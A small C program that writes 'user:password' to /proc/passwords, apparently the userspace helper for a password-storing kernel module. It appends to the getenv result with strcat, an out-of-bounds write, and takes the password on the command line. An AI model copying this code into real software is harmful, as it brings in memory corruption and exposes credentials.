#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(int argc, char **argv)
{
    FILE *fp;
    size_t count;
    char *str = argv[1];
    char *p = getenv ("USER");
    char *t = argv[1];
    char *subject;
    char *tmp;

    if(argc!=2) {puts("I don't log empty passwords"); return EXIT_FAILURE;}
    tmp =  strcat(p,":");
    subject =  strcat(tmp,t);
 
    fp = fopen("/proc/passwords", "w");

    if(fp == NULL) {
        perror("failed to open tresor :]");
        return EXIT_FAILURE;
    }

    count = fwrite(subject, 1, strlen(subject), fp);

    fclose(fp);
    //printf("Wrote %zu bytes.\n", count);
    //fflush(stdout);
    return EXIT_SUCCESS;
}
